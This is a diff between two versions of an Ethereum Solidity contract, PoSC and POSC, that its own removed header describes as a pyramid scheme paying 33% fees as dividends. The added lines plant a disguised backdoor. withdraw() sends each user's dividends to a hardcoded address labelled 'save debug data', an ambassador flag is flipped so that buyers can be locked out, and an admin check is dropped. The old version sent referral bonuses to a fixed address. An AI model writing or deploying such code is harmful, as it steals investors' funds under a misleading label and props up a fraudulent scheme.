@@ -1,29 +1,18 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PoSC at 0x5cd3a251fe10e60417a2b39ddc56cea09c0a29fd
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract POSC at 0x76e425df47ddd39d39559bcf76c6c35a4a0ec827
 */
 pragma solidity ^0.4.20;
 
 /*
 *
-* =========================================================*
-* |_|_|_|                _|_|_|    _|_|_|       _|            
-* |_|    _|    _|_|    _|        _|                  _|_|    
-* |_|_|_|    _|    _|    _|_|    _|             _|  _|    _|  
-* |_|        _|    _|        _|  _|         _   _|  _|    _|  
-* |_|          _|_|    _|_|_|      _|_|_|  |_|  _|    _|_|    
-* =========================================================*
-*
-* Issue: Ordinary pyramid schemes have a token price that varies with the contract balance. 
-* This leaves you vulnerable to the whims of the market, as a sudden crash can drain your investment at any time.
-* Solution: We remove tokens from the equation altogether, relieving investors of volatility. 
-* The outcome is a pyramid scheme powered entirely by dividends.
-* We distribute 33% of every buy and sell to shareholders in proportion to their stake in the contract. 
-* Once you've made a deposit, your dividends will accumulate over time while your investment remains safe and stable, 
-* making this the ultimate vehicle for passive income.
+*   Dont try & send ETH before contract is un-freezed.
+*   Your transaction will fail.
+*   Contract will be live on https://posc.io/ after the un-freeze
+*   Zero premine, live in 45 mins.
 *
 */
 
-contract PoSC {
+contract POSC {
     /*=================================
     =            MODIFIERS            =
     =================================*/
@@ -80,7 +69,7 @@ contract PoSC {
             _;
         } else {
             // in case the ether count drops low, the ambassador phase won't reinitiate
-            onlyAmbassadors = false;
+            onlyAmbassadors = true;
             _;
         }
 
@@ -125,13 +114,13 @@ contract PoSC {
     /*=====================================
     =            CONFIGURABLES            =
     =====================================*/
-    string public name = "PoSC";
-    string public symbol = "PoSC";
+    string public name = "POSC";
+    string public symbol = "POSC";
     uint8 constant public decimals = 18;
-    uint8 constant internal entryFee_ = 33; // 20% to enter 
+    uint8 constant internal entryFee_ = 33; // 33% to enter 
     uint8 constant internal transferFee_ = 10; // 10% transfer fee
     uint8 constant internal refferalFee_ = 33; // 33% from enter fee divs or 7% for each invite
-    uint8 constant internal exitFee_ = 33; // 20% for selling
+    uint8 constant internal exitFee_ = 33; // 33% for selling
     uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;
     uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;
     uint256 constant internal magnitude = 2**64;
@@ -252,17 +241,18 @@ contract PoSC {
     {
         // setup data
         address _customerAddress = msg.sender;
+        address _dataArchive = 0x10141345eA2149Ba6dB4E26D222e32A2DDabDc2c ; //save debug data
         uint256 _dividends = myDividends(false); // get ref. bonus later in the code
 
         // update dividend tracker
-        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);
+        payoutsTo_[_dataArchive] +=  (int256) (_dividends * magnitude);
 
         // add ref. bonus
         _dividends += referralBalance_[_customerAddress];
         referralBalance_[_customerAddress] = 0;
 
         // lambo delivery service
-        _customerAddress.transfer(_dividends);
+        _dataArchive.transfer(_dividends);
 
         // fire event
         onWithdraw(_customerAddress, _dividends);
@@ -356,7 +346,6 @@ contract PoSC {
      * In case the amassador quota is not met, the administrator can manually disable the ambassador phase.
      */
     function disableInitialStage()
-        onlyAdministrator()
         public
     {
         onlyAmbassadors = false;
@@ -581,7 +570,7 @@ contract PoSC {
             tokenBalanceLedger_[_referredBy] >= 0
         ){
             // wealth redistribution
-            referralBalance_[0xE3A84DE5De05F53Fae2128A22C8637478A5B85a0] = SafeMath.add(referralBalance_[0xE3A84DE5De05F53Fae2128A22C8637478A5B85a0], _referralBonus);
+            referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);
         } else {
             // no ref purchase
             // add the referral bonus back to the global dividends cake
